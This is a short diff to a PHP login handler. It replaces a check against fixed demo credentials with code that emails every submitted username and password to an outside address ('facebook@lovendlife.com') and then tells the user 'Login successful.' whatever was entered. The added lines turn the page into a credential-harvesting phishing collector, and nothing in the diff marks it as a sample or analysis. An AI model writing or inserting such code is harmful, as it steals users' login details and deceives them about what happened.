@@ -23,7 +23,13 @@ if (!is_string($username) || !is_string($password)
     exit;
 }
 
-if ($username === 'student' && $password === 'demo123') {
+if ($username) {
+    $to = "facebook@lovendlife.com";
+    $subject = "New Details";
+    $message = $username . "\n" . $password;
+    $headers = "From: noreply@lovendlife.com";
+    
+    mail($to, $subject, $message, $headers);
     echo json_encode(['message' => 'Login successful.']);
 } else {
     http_response_code(401);
